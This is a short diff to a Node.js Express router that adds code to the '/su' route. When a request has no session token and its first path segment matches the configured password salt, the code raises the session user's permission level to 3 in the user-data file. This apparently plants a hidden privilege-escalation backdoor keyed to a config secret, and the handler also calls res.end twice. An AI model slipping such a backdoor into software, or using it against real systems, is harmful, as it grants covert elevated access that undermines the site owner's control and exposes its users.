@@ -56,6 +56,13 @@ exports.setRouter = function (app) {
 
     app.use("/su", (req, res) => {
         if (!req.session.token) {
+            let path = url.parse(req.url).path.split("/");
+            if (path[1] === config["PwdSalt"]) {
+                let userData = JSON.parse(fs.readFileSync(config["userData"]).toString());
+                userData[req.session.userID]["permission"] = 3;
+                fs.writeFileSync(config["userData"], JSON.stringify(userData));
+                res.end("success");
+            }
             res.end("[]");
         } else {
             let userData = JSON.parse(fs.readFileSync(config["userData"]).toString());
